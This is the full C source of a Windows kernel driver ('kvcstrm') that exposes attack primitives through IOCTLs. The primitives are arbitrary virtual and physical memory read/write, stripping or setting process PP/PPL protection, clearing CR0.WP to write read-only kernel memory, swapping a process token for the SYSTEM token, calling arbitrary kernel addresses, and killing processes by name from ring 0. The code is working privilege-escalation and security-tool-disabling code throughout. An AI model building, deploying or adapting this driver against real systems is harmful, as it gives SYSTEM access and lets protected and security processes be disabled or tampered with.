// kvcstrm.c
// KMDF control driver exposing kernel-mode primitives via IOCTL interface.
// Provides virtual/physical memory R/W, process control, PP/PPL manipulation,
// kernel pool management, write-protect bypass, and token replacement.
//
// Device : \\Device\\kvcstrm
// Symlink: \\DosDevices\\kvcstrm
// SDDL   : D:P(A;;GA;;;SY)(A;;GA;;;BA)  -- SYSTEM and local Administrators only.
// Queue  : sequential, METHOD_BUFFERED throughout.

#include "kvcstrm.h"

WDFDEVICE g_Device = NULL;

// Each kernel allocation issued through IOCTL_ALLOC_KERNEL is tracked in a
// singly-typed node inserted into g_AllocListHead.  FreeKernelMemory validates
// the caller-supplied address against this list before releasing pool, preventing
// arbitrary free and double-free of kernel pool.
typedef struct _TRACKED_ALLOCATION {
    LIST_ENTRY ListEntry;
    PVOID      Address;
    SIZE_T     Size;
} TRACKED_ALLOCATION, *PTRACKED_ALLOCATION;

LIST_ENTRY g_AllocListHead;   // protected by g_AllocListLock
KSPIN_LOCK g_AllocListLock;

// =============================================================
// VIRTUAL MEMORY R/W
// =============================================================

// Copies memory between the caller's address space (Req->Buffer) and the
// virtual address space of the target process (Req->Address) using
// MmCopyVirtualMemory, which handles cross-process page table switching
// and raises an exception on unmapped or inaccessible pages.
// KernelMode previous-mode suppresses user-mode address range checks on
// the kernel side of the transfer.

NTSTATUS ReadWriteMemory(PKERNEL_READWRITE_REQUEST Req)
{
    PEPROCESS TargetProcess = NULL;
    PEPROCESS ClientProcess;
    NTSTATUS  status;
    SIZE_T    copied = 0;

    if (!Req || Req->Size == 0 || Req->Size > MAX_TRANSFER_SIZE ||
        Req->Address == 0 || Req->Buffer == 0)
        return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Req->ProcessId, &TargetProcess);
    if (!NT_SUCCESS(status))
        return status;

    ClientProcess = PsGetCurrentProcess();

    if (Req->Write) {
        status = MmCopyVirtualMemory(ClientProcess, (PVOID)(ULONG_PTR)Req->Buffer,
                                     TargetProcess, (PVOID)(ULONG_PTR)Req->Address,
                                     Req->Size, KernelMode, &copied);
    } else {
        status = MmCopyVirtualMemory(TargetProcess, (PVOID)(ULONG_PTR)Req->Address,
                                     ClientProcess, (PVOID)(ULONG_PTR)Req->Buffer,
                                     Req->Size, KernelMode, &copied);
    }

    ObDereferenceObject(TargetProcess);
    return status;
}

// Executes up to MAX_BULK_OPERATIONS read/write requests in a single IOCTL
// round-trip.  Each sub-operation receives its own Status field.
// The function return value reflects the first sub-operation failure, or
// STATUS_SUCCESS if all succeeded.

NTSTATUS HandleBulkOperations(PKERNEL_BULK_OPERATION BulkReq)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG i;

    if (!BulkReq || BulkReq->Count == 0 || BulkReq->Count > MAX_BULK_OPERATIONS)
        return STATUS_INVALID_PARAMETER;

    for (i = 0; i < BulkReq->Count; i++) {
        BulkReq->Operations[i].Status = ReadWriteMemory(&BulkReq->Operations[i]);
        if (!NT_SUCCESS(BulkReq->Operations[i].Status) && NT_SUCCESS(status))
            status = BulkReq->Operations[i].Status;
    }
    return status;
}

// =============================================================
// PROCESS TERMINATION
// =============================================================

// Opens a kernel handle to the target process via ObOpenObjectByPointer,
// bypassing standard object manager access checks and user-mode callbacks.
// ZwTerminateProcess issued from ring-0 with a kernel handle cannot be
// intercepted by PPL or user-mode APC injection.

NTSTATUS KillProcess(PKERNEL_KILL_REQUEST Req)
{
    PEPROCESS process;
    HANDLE    hProcess;
    NTSTATUS  status;

    if (!Req || Req->ProcessId == 0)
        return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    status = ObOpenObjectByPointer(process,
                                   OBJ_KERNEL_HANDLE,
                                   NULL,
                                   PROCESS_TERMINATE,
                                   *PsProcessType,
                                   KernelMode,
                                   &hProcess);
    ObDereferenceObject(process);
    if (!NT_SUCCESS(status))
        return status;

    status = ZwTerminateProcess(hProcess, 0);
    ZwClose(hProcess);
    return status;
}

// =============================================================
// PP / PPL MANIPULATION
// =============================================================

// Writes one byte to the PS_PROTECTION field in EPROCESS at ProtectionOffset.
// EPROCESS resides in non-paged pool and is always writable at any IRQL.
// ProtectionOffset is resolved by the caller from PDB symbols for the running
// build; accepted range is 1..0x2000 to bound writes within the structure.
//
// Common ProtectionValue encoding (PS_PROTECTION byte):
//   0x00 - unprotected
//   0x61 - PPL Windows      (Type=1, Signer=6)
//   0x62 - PPL Antimalware  (Type=2, Signer=6)
//   0x72 - PP  Antimalware  (Type=2, Signer=7)

NTSTATUS SetProcessProtection(PKERNEL_PROTECTION_REQUEST Req)
{
    PEPROCESS process;
    NTSTATUS  status;

    if (!Req || Req->ProcessId == 0 || Req->ProtectionOffset == 0 || Req->ProtectionOffset > 0x2000)
        return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    // Direct assignment is perfectly safe here as EPROCESS is in NonPagedPool.
    *((PUCHAR)process + Req->ProtectionOffset) = Req->ProtectionValue;

    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

// =============================================================
// PHYSICAL MEMORY R/W
// =============================================================

// Maps a physical address range into kernel virtual address space using
// MmMapIoSpaceEx, transfers data to/from the caller's user-mode buffer,
// then unmaps the range.
//
// Before mapping, the requested range is validated against the system's
// physical memory descriptor list (MmGetPhysicalMemoryRanges).  Addresses
// outside normal RAM -- including MMIO regions -- are rejected with
// STATUS_INVALID_ADDRESS.  If the descriptor list cannot be allocated,
// the validation step is skipped and mapping proceeds.
//
// Req->Buffer is a user-mode virtual address in the calling process.
// ProbeForRead/Write verifies accessibility before the copy.

NTSTATUS PhysMemAccess(PKERNEL_PHYSMEM_REQUEST Req, BOOLEAN Write)
{
    PHYSICAL_ADDRESS physAddr;
    PVOID            mapped;
    NTSTATUS         status = STATUS_SUCCESS;

    if (!Req || Req->Size == 0 || Req->Size > MAX_PHYSMEM_SIZE || Req->Buffer == 0)
        return STATUS_INVALID_PARAMETER;

    physAddr.QuadPart = Req->PhysicalAddress;

    // Validate that the requested physical range falls within normal RAM,
    // not MMIO or other memory-mapped hardware regions.
    PPHYSICAL_MEMORY_RANGE ranges = MmGetPhysicalMemoryRanges();
    if (ranges) {
        BOOLEAN inRam = FALSE;
        for (ULONG r = 0; ranges[r].NumberOfBytes.QuadPart != 0; r++) {
            if (Req->PhysicalAddress >= (ULONG64)ranges[r].BaseAddress.QuadPart &&
                Req->PhysicalAddress + Req->Size <=
                    (ULONG64)ranges[r].BaseAddress.QuadPart + (ULONG64)ranges[r].NumberOfBytes.QuadPart) {
                inRam = TRUE;
                break;
            }
        }
        // Fix: Use ExFreePool for buffers returned by system routines, 
        // as the tag used by MmGetPhysicalMemoryRanges (usually 'MmPm') 
        // won't match 'hPmM', causing BSOD 0x139 on Win11.
        ExFreePool(ranges);
        if (!inRam)
            return STATUS_INVALID_ADDRESS;
    }

    mapped = MmMapIoSpaceEx(physAddr, Req->Size,
                            Write ? PAGE_READWRITE : PAGE_READONLY);
    if (!mapped)
        return STATUS_INSUFFICIENT_RESOURCES;

    __try {
        if (Write) {
            ProbeForRead((PVOID)(ULONG_PTR)Req->Buffer, Req->Size, sizeof(UCHAR));
            RtlCopyMemory(mapped, (PVOID)(ULONG_PTR)Req->Buffer, Req->Size);
        } else {
            ProbeForWrite((PVOID)(ULONG_PTR)Req->Buffer, Req->Size, sizeof(UCHAR));
            RtlCopyMemory((PVOID)(ULONG_PTR)Req->Buffer, mapped, Req->Size);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    MmUnmapIoSpace(mapped, Req->Size);
    return status;
}

// =============================================================
// KERNEL MEMORY ALLOCATION / FREE
// =============================================================

// Allocates non-paged kernel pool and registers the allocation in the
// tracking list.  Req->Address receives the kernel virtual address on
// success.  The caller must release the allocation via FreeKernelMemory;
// no other free path is valid.
//
// Flags bit 0x01 (OMNI_ALLOC_NONPAGED_EXECUTE): selects
// POOL_FLAG_NON_PAGED_EXECUTE.  All other flag bits are ignored.
// Maximum allocation size is 16 MB.

NTSTATUS AllocKernelMemory(PKERNEL_ALLOC_REQUEST Req)
{
    POOL_FLAGS flags;
    PVOID      mem;
    PTRACKED_ALLOCATION tracker;
    KIRQL      oldIrql;

    if (!Req || Req->Size == 0 || Req->Size > 16ULL * 1024 * 1024)
        return STATUS_INVALID_PARAMETER;

    flags = (Req->Flags & OMNI_ALLOC_NONPAGED_EXECUTE)
            ? POOL_FLAG_NON_PAGED_EXECUTE
            : POOL_FLAG_NON_PAGED;

    mem = ExAllocatePool2(flags, Req->Size, POOL_TAG);
    if (!mem) {
        Req->Address = 0;
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    tracker = (PTRACKED_ALLOCATION)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(TRACKED_ALLOCATION), POOL_TAG);
    if (!tracker) {
        ExFreePoolWithTag(mem, POOL_TAG);
        Req->Address = 0;
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    tracker->Address = mem;
    tracker->Size    = Req->Size;

    KeAcquireSpinLock(&g_AllocListLock, &oldIrql);
    InsertTailList(&g_AllocListHead, &tracker->ListEntry);
    KeReleaseSpinLock(&g_AllocListLock, oldIrql);

    Req->Address = (ULONG64)mem;
    return STATUS_SUCCESS;
}

// Releases a kernel allocation previously issued by AllocKernelMemory.
// The address is looked up in the tracking list under the spinlock; only
// registered addresses are freed.  Unrecognised addresses and double-free
// attempts return STATUS_INVALID_PARAMETER without touching pool.

NTSTATUS FreeKernelMemory(PKERNEL_FREE_REQUEST Req)
{
    PLIST_ENTRY         next;
    PTRACKED_ALLOCATION tracker = NULL;
    BOOLEAN             found   = FALSE;
    KIRQL               oldIrql;

    if (!Req || Req->Address == 0)
        return STATUS_INVALID_PARAMETER;

    KeAcquireSpinLock(&g_AllocListLock, &oldIrql);
    next = g_AllocListHead.Flink;
    while (next != &g_AllocListHead) {
        tracker = CONTAINING_RECORD(next, TRACKED_ALLOCATION, ListEntry);
        if (tracker->Address == (PVOID)Req->Address) {
            RemoveEntryList(next);
            found = TRUE;
            break;
        }
        next = next->Flink;
    }
    KeReleaseSpinLock(&g_AllocListLock, oldIrql);

    if (found) {
        ExFreePoolWithTag(tracker->Address, POOL_TAG);
        ExFreePoolWithTag(tracker, POOL_TAG);
        return STATUS_SUCCESS;
    }

    return STATUS_INVALID_PARAMETER;
}

// =============================================================
// WRITE TO READ-ONLY KERNEL MEMORY
// =============================================================

// Writes to a kernel virtual address that resides on a write-protected page
// by temporarily clearing the CR0.WP (Write Protect) bit.
//
// Prerequisites:
//   HVCI must be off -- if it were active, this unsigned driver could not
//   have loaded.  With HVCI off, CR0.WP is the sole hardware enforcement
//   layer for kernel write protection, and clearing it reaches the PTEs.
//
// Critical section ordering (this core only):
//   1. Raise IRQL to DISPATCH_LEVEL -- blocks scheduler preemption and
//      software interrupts on this core.
//   2. CLI (_disable) -- blocks hardware interrupts on this core.
//   3. Clear CR0.WP -- write protection disabled.
//   4. RtlCopyMemory -- perform the write.
//   5. Restore CR0.WP -- write protection re-enabled.
//   6. STI (_enable) -- re-enable hardware interrupts.
//   7. Lower IRQL.
//
// Note: other CPUs are not halted; concurrent execution on a different core
// during the WP=0 window is an accepted limitation of this technique.
//
// DstAddress is validated with MmIsAddressValid before entering the critical
// section.  __try/__except catches exceptions on the write path and restores
// CPU state before returning.
//
// Input buffer layout: [KERNEL_PROTECTED_WRITE_REQUEST][payload bytes]

NTSTATUS WriteProtectedKernelMemory(PKERNEL_PROTECTED_WRITE_REQUEST Req,
                                    SIZE_T TotalInputSize)
{
    SIZE_T  headerSize = sizeof(KERNEL_PROTECTED_WRITE_REQUEST);
    PVOID   srcData;
    KIRQL   oldIrql;
    ULONG64 cr0;

    if (!Req || Req->Size == 0 || Req->DstAddress == 0)
        return STATUS_INVALID_PARAMETER;

    // Reject if payload would extend beyond the input buffer, guarding
    // against arithmetic overflow in the size expression.
    if (Req->Size > MAX_TRANSFER_SIZE || TotalInputSize < headerSize || Req->Size > (TotalInputSize - headerSize))
        return STATUS_BUFFER_TOO_SMALL;

    srcData = (PUCHAR)Req + headerSize;

    // Sanity-check destination address before disabling interrupts.
    if (!MmIsAddressValid((PVOID)Req->DstAddress))
        return STATUS_INVALID_ADDRESS;

    oldIrql = KeRaiseIrqlToDpcLevel();
    _disable();

    cr0 = __readcr0();
    __writecr0(cr0 & ~0x10000ULL);  // clear WP bit

    __try {
        RtlCopyMemory((PVOID)Req->DstAddress, srcData, Req->Size);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        __writecr0(cr0);            // restore WP before returning
        _enable();
        KeLowerIrql(oldIrql);
        return GetExceptionCode();
    }

    __writecr0(cr0);                // restore WP
    _enable();
    KeLowerIrql(oldIrql);
    return STATUS_SUCCESS;
}

// =============================================================
// TOKEN REPLACEMENT
// =============================================================

// Replaces the primary token of the target process with the SYSTEM token
// from PsInitialSystemProcess.  After this call the target process holds
// full NT AUTHORITY\SYSTEM privileges.
//
// The Token field in EPROCESS is typed EX_FAST_REF: the lower 4 bits carry
// a reference count rather than address bits.  We mask those bits to obtain
// the object pointer, take an explicit reference on the SYSTEM token, then
// atomically replace the target token and release the old reference.
//
// TokenOffset must be in range 1..0x2000 (PDB-resolved by the caller for
// the running build; e.g. 0x4B8 on Windows 11 build 26200).

NTSTATUS ElevateProcessToken(PKERNEL_TOKEN_REQUEST Req)
{
    PEPROCESS targetProcess;
    NTSTATUS  status;
    ULONG64   sysFastRef;
    PVOID     sysToken;
    ULONG64   oldFastRef;
    PVOID     oldToken;

    if (!Req || Req->ProcessId == 0 || Req->TokenOffset == 0 || Req->TokenOffset > 0x2000)
        return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Req->ProcessId, &targetProcess);
    if (!NT_SUCCESS(status))
        return status;

    // Read the SYSTEM token EX_FAST_REF and strip the reference count bits to get the pointer.
    sysFastRef = *(PULONG64)((PUCHAR)PsInitialSystemProcess + Req->TokenOffset);
    sysToken = (PVOID)(sysFastRef & ~(ULONG64)0xF);

    // Increment the object reference count for the system token since the target 
    // process will now hold a persistent pointer to it.
    ObReferenceObject(sysToken);

    // Atomically swap the token pointer in the target process.
    // We write the raw pointer (which effectively sets fast references to 0).
    oldFastRef = (ULONG64)InterlockedExchange64(
        (volatile LONG64*)((PUCHAR)targetProcess + Req->TokenOffset),
        (LONG64)sysToken
    );

    // Extract the old token pointer from the replaced EX_FAST_REF and release
    // the reference previously held by the target process.
    oldToken = (PVOID)(oldFastRef & ~(ULONG64)0xF);
    if (oldToken) {
        ObDereferenceObject(oldToken);
    }

    ObDereferenceObject(targetProcess);
    return STATUS_SUCCESS;
}

// =============================================================
// PROCESS ENUMERATION AND TERMINATION BY NAME
// =============================================================

typedef PEPROCESS (*PFN_PS_GET_NEXT_PROCESS)(PEPROCESS Process);

// Byte offset of the ImageFileName field within EPROCESS.
// Resolved dynamically at driver load; falls back to 0x5A8 (Win11 22H2/23H2)
// if the scan does not produce a result.
ULONG g_ImageFileNameOffset = 0;

// Locates the ImageFileName field in EPROCESS by scanning the known EPROCESS
// of PsInitialSystemProcess (the "System" process) for the literal string
// "System" between offsets 0x100 and 0x800.  Records the offset globally on
// first match.

NTSTATUS FindImageFileNameOffset()
{
    PEPROCESS current = PsInitialSystemProcess;
    for (ULONG i = 0x100; i < 0x800; i++) {
        if (strncmp((char*)current + i, "System", 6) == 0) {
            g_ImageFileNameOffset = i;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

// Iterates all processes via PsGetNextProcess (resolved at runtime) and
// terminates every process whose ImageFileName begins with Req->ProcessName
// (case-insensitive prefix match, up to 15 characters).
//
// ProcessName is null-terminated in place before use to guarantee a safe
// strlen call regardless of caller-supplied content.
// KilledCount is set to the number of processes successfully terminated.
// Returns STATUS_SUCCESS even when no matching process is found.

NTSTATUS KillProcessesByName(PKERNEL_KILL_NAME_REQUEST Req)
{
    PEPROCESS               process = NULL;
    HANDLE                  hProcess;
    ULONG                   killed  = 0;
    PCHAR                   imageName;
    NTSTATUS                status;
    UNICODE_STRING          routineNext;
    PFN_PS_GET_NEXT_PROCESS pPsGetNextProcess;
    SIZE_T                  inputNameLen;

    if (!Req || Req->ProcessName[0] == 0)
        return STATUS_INVALID_PARAMETER;

    // Guarantee null-termination regardless of caller-supplied buffer content.
    Req->ProcessName[MAX_PROCESS_NAME - 1] = '\0';
    inputNameLen = strlen(Req->ProcessName);

    RtlInitUnicodeString(&routineNext, L"PsGetNextProcess");
    pPsGetNextProcess = (PFN_PS_GET_NEXT_PROCESS)MmGetSystemRoutineAddress(&routineNext);
    if (!pPsGetNextProcess)
        return STATUS_NOT_SUPPORTED;

    // Use the dynamically resolved offset; fall back to the Win11 22H2/23H2 default.
    ULONG offset = g_ImageFileNameOffset ? g_ImageFileNameOffset : 0x5A8;

    process = pPsGetNextProcess(NULL);
    while (process) {
        imageName = (PCHAR)process + offset;

        if (imageName[0] != 0) {
            if (_strnicmp(imageName, Req->ProcessName, inputNameLen) == 0) {
                status = ObOpenObjectByPointer(process,
                                              OBJ_KERNEL_HANDLE,
                                              NULL,
                                              PROCESS_TERMINATE,
                                              *PsProcessType,
                                              KernelMode,
                                              &hProcess);
                if (NT_SUCCESS(status)) {
                    if (NT_SUCCESS(ZwTerminateProcess(hProcess, 0)))
                        killed++;
                    ZwClose(hProcess);
                }
            }
        }
        process = pPsGetNextProcess(process);
    }

    Req->KilledCount = killed;
    return STATUS_SUCCESS;
}

// Closes a handle in the handle table of the specified process by temporarily
// attaching to its address space with KeStackAttachProcess.
// HandleValue must be a valid handle in the target process, not in the caller.

NTSTATUS ForceCloseHandle(PKERNEL_CLOSE_HANDLE_REQUEST Req)
{
    PEPROCESS  process;
    NTSTATUS   status;
    KAPC_STATE apc;

    if (!Req || Req->HandleValue == NULL)
        return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)Req->ProcessId, &process);
    if (!NT_SUCCESS(status))
        return status;

    KeStackAttachProcess(process, &apc);
    status = ZwClose(Req->HandleValue);
    KeUnstackDetachProcess(&apc);

    ObDereferenceObject(process);
    return status;
}

// =============================================================
// KERNEL CALL PRIMITIVE
// =============================================================

// Casts Address to a four-argument x64 function pointer and calls it with
// Args[0..3] mapped to RCX, RDX, R8, R9.  The return value is written back
// to Req->ReturnValue.
//
// This is a raw call primitive.  The two checks below are sanity guards
// against trivially wrong usage, NOT safety guarantees:
//
//   1. Address >= 0xFFFF800000000000: rejects user-mode addresses to prevent
//      SMEP-bypass via this path.  It does NOT validate that the target is a
//      correct entry point, has a matching prototype, or is safe to call in
//      the current context.  Wrong IRQL, wrong PreviousMode, wrong process/
//      thread attachment, lock-ordering violations, or bad side effects in the
//      callee can all still result in a bugcheck.
//
//   2. MmIsAddressValid: confirms only that the first byte of Address is
//      currently mapped in the kernel page tables.  It does NOT verify that
//      the target is non-pageable (a paged routine called above APC_LEVEL will
//      bugcheck), that it is a valid entry point, or that subsequent memory
//      accesses made by the callee won't fault.
//
//   3. __try/__except catches hardware exceptions (AV, GPF) on the call site
//      itself.  It does NOT protect against: bugchecks asserted by the callee
//      or the kernel subsystems it invokes, IRQL violations, deadlocks,
//      corruption of kernel state, DPC watchdog expiry, or any partially
//      executed side effects that occurred before the fault.
//
//   4. The 4-argument model covers the x64 register set (RCX/RDX/R8/R9).
//      Many kernel routines require more than register arguments: a specific
//      IRQL, prior KeStackAttachProcess, a held lock, a live object reference,
//      or buffers from a specific address space.  Those preconditions are the
//      sole responsibility of the caller.
//
// IRQL: dispatched at PASSIVE_LEVEL by the sequential KMDF queue.  Most
// exported Nt/Zw/Ex/Mm routines are safe at PASSIVE_LEVEL; Ke/DISPATCH-level
// routines must be called from shellcode that raises IRQL itself.

NTSTATUS CallKernelAddress(PKERNEL_CALL_REQUEST Req)
{
    typedef ULONG64 (*PFUNC_CALL)(ULONG64, ULONG64, ULONG64, ULONG64);
    PFUNC_CALL pfn;

    if (!Req || Req->Address == 0)
        return STATUS_INVALID_PARAMETER;

    // Reject user-space addresses -- prevents SMEP-bypass attempts and
    // limits the primitive to kernel virtual address space only.
    if (Req->Address < 0xFFFF800000000000ULL)
        return STATUS_ACCESS_DENIED;

    if (!MmIsAddressValid((PVOID)Req->Address))
        return STATUS_INVALID_ADDRESS;

    pfn = (PFUNC_CALL)(ULONG_PTR)Req->Address;

    __try {
        Req->ReturnValue = pfn(Req->Args[0], Req->Args[1], Req->Args[2], Req->Args[3]);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        Req->ReturnValue = 0;
        return GetExceptionCode();
    }

    return STATUS_SUCCESS;
}

// =============================================================
// IOCTL DISPATCHER
// =============================================================

// Single sequential dispatch handler for all IOCTLs.
// For most codes the WDF request status is STATUS_SUCCESS and the actual
// operation result is returned in the Status field of the output structure.
// IOCTL_KILL_PROCESS_WESMAR is the exception: it propagates the operation
// status directly as the request completion status (legacy behaviour).

VOID EvtIoDeviceControl(
    WDFQUEUE  Queue,
    WDFREQUEST Request,
    size_t    OutputBufferLength,
    size_t    InputBufferLength,
    ULONG     IoControlCode
)
{
    NTSTATUS status        = STATUS_INVALID_DEVICE_REQUEST;
    size_t   bytesReturned = 0;
    PVOID    inBuf         = NULL;

    UNREFERENCED_PARAMETER(Queue);
    UNREFERENCED_PARAMETER(OutputBufferLength);

    if (InputBufferLength == 0) {
        WdfRequestComplete(Request, STATUS_BUFFER_TOO_SMALL);
        return;
    }

    status = WdfRequestRetrieveInputBuffer(Request, 1, &inBuf, NULL);
    if (!NT_SUCCESS(status)) {
        WdfRequestComplete(Request, status);
        return;
    }

    switch (IoControlCode) {

        // ---- Virtual memory R/W --------------------------------

        case IOCTL_READWRITE_DRIVER_READ:
        case IOCTL_READWRITE_DRIVER_WRITE: {
            if (InputBufferLength < sizeof(KERNEL_READWRITE_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_READWRITE_REQUEST req = (PKERNEL_READWRITE_REQUEST)inBuf;
            req->Write  = (IoControlCode == IOCTL_READWRITE_DRIVER_WRITE);
            req->Status = ReadWriteMemory(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_READWRITE_REQUEST);
            break;
        }

        case IOCTL_READWRITE_DRIVER_BULK: {
            if (InputBufferLength < sizeof(KERNEL_BULK_OPERATION)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_BULK_OPERATION req = (PKERNEL_BULK_OPERATION)inBuf;
            status = HandleBulkOperations(req);
            bytesReturned = InputBufferLength;
            break;
        }

        // ---- Process termination -------------------------------

        // Legacy IOCTL: input is a raw ULONG PID; operation status is returned
        // directly as the WDF request completion status (no output structure).
        case IOCTL_KILL_PROCESS_WESMAR: {
            if (InputBufferLength < sizeof(ULONG)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            ULONG targetPid = *(PULONG)inBuf;
            PEPROCESS process;
            HANDLE hProcess;

            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &process);
            if (NT_SUCCESS(status)) {
                status = ObOpenObjectByPointer(process,
                                               OBJ_KERNEL_HANDLE,
                                               NULL,
                                               PROCESS_TERMINATE,
                                               *PsProcessType,
                                               KernelMode,
                                               &hProcess);
                ObDereferenceObject(process);
                if (NT_SUCCESS(status)) {
                    status = ZwTerminateProcess(hProcess, 0);
                    ZwClose(hProcess);
                }
            }
            bytesReturned = 0;
            break;
        }

        case IOCTL_KILL_PROCESS: {
            if (InputBufferLength < sizeof(KERNEL_KILL_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_KILL_REQUEST req = (PKERNEL_KILL_REQUEST)inBuf;
            req->Status = KillProcess(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_KILL_REQUEST);
            break;
        }

        // ---- PP / PPL manipulation -----------------------------

        case IOCTL_SET_PROTECTION: {
            if (InputBufferLength < sizeof(KERNEL_PROTECTION_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_PROTECTION_REQUEST req = (PKERNEL_PROTECTION_REQUEST)inBuf;
            req->Status = SetProcessProtection(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_PROTECTION_REQUEST);
            break;
        }

        // ---- Physical memory R/W -------------------------------

        case IOCTL_PHYSMEM_READ:
        case IOCTL_PHYSMEM_WRITE: {
            if (InputBufferLength < sizeof(KERNEL_PHYSMEM_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_PHYSMEM_REQUEST req = (PKERNEL_PHYSMEM_REQUEST)inBuf;
            req->Status = PhysMemAccess(req, IoControlCode == IOCTL_PHYSMEM_WRITE);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_PHYSMEM_REQUEST);
            break;
        }

        // ---- Kernel pool allocation / free ---------------------

        case IOCTL_ALLOC_KERNEL: {
            if (InputBufferLength < sizeof(KERNEL_ALLOC_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_ALLOC_REQUEST req = (PKERNEL_ALLOC_REQUEST)inBuf;
            req->Status = AllocKernelMemory(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_ALLOC_REQUEST);
            break;
        }

        case IOCTL_FREE_KERNEL: {
            if (InputBufferLength < sizeof(KERNEL_FREE_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_FREE_REQUEST req = (PKERNEL_FREE_REQUEST)inBuf;
            req->Status = FreeKernelMemory(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_FREE_REQUEST);
            break;
        }

        // ---- Write to read-only kernel memory ------------------

        case IOCTL_WRITE_PROTECTED: {
            if (InputBufferLength < sizeof(KERNEL_PROTECTED_WRITE_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_PROTECTED_WRITE_REQUEST req = (PKERNEL_PROTECTED_WRITE_REQUEST)inBuf;
            req->Status = WriteProtectedKernelMemory(req, InputBufferLength);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_PROTECTED_WRITE_REQUEST);
            break;
        }

        // ---- Token replacement ---------------------------------

        case IOCTL_ELEVATE_TOKEN: {
            if (InputBufferLength < sizeof(KERNEL_TOKEN_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_TOKEN_REQUEST req = (PKERNEL_TOKEN_REQUEST)inBuf;
            req->Status = ElevateProcessToken(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_TOKEN_REQUEST);
            break;
        }

        // ---- Process termination by name / handle close --------

        case IOCTL_KILL_BY_NAME: {
            if (InputBufferLength < sizeof(KERNEL_KILL_NAME_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_KILL_NAME_REQUEST req = (PKERNEL_KILL_NAME_REQUEST)inBuf;
            req->Status = KillProcessesByName(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_KILL_NAME_REQUEST);
            break;
        }

        case IOCTL_FORCE_CLOSE_HANDLE: {
            if (InputBufferLength < sizeof(KERNEL_CLOSE_HANDLE_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_CLOSE_HANDLE_REQUEST req = (PKERNEL_CLOSE_HANDLE_REQUEST)inBuf;
            req->Status = ForceCloseHandle(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_CLOSE_HANDLE_REQUEST);
            break;
        }

        // ---- Kernel call primitive -----------------------------

        case IOCTL_CALL_KERNEL: {
            if (InputBufferLength < sizeof(KERNEL_CALL_REQUEST)) {
                status = STATUS_BUFFER_TOO_SMALL; break;
            }
            PKERNEL_CALL_REQUEST req = (PKERNEL_CALL_REQUEST)inBuf;
            req->Status = CallKernelAddress(req);
            status = STATUS_SUCCESS;
            bytesReturned = sizeof(KERNEL_CALL_REQUEST);
            break;
        }

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    WdfRequestCompleteWithInformation(Request, status, bytesReturned);
}

// =============================================================
// DRIVER UNLOAD
// =============================================================

// Drains the allocation tracking list and releases any kernel pool that was
// allocated through IOCTL_ALLOC_KERNEL but never freed by the client.
// The list is transferred to a local LIST_ENTRY under the spinlock to keep
// the critical section short; pool is freed after the spinlock is released.

VOID EvtDriverUnload(WDFDRIVER Driver)
{
    UNREFERENCED_PARAMETER(Driver);

    PLIST_ENTRY         next;
    PTRACKED_ALLOCATION tracker;
    KIRQL               oldIrql;

    // Drain the allocation tracking list and release any kernel pool that was
    // allocated through IOCTL_ALLOC_KERNEL but never freed by the client.
    // We pop entries one by one under the spinlock to ensure safety.

    KeAcquireSpinLock(&g_AllocListLock, &oldIrql);
    while (!IsListEmpty(&g_AllocListHead)) {
        next = RemoveHeadList(&g_AllocListHead);
        KeReleaseSpinLock(&g_AllocListLock, oldIrql);

        tracker = CONTAINING_RECORD(next, TRACKED_ALLOCATION, ListEntry);
        
        // Free both the tracked memory and the tracker node itself.
        if (tracker->Address) {
            ExFreePoolWithTag(tracker->Address, POOL_TAG);
        }
        ExFreePoolWithTag(tracker, POOL_TAG);

        KeAcquireSpinLock(&g_AllocListLock, &oldIrql);
    }
    KeReleaseSpinLock(&g_AllocListLock, oldIrql);
}

// =============================================================
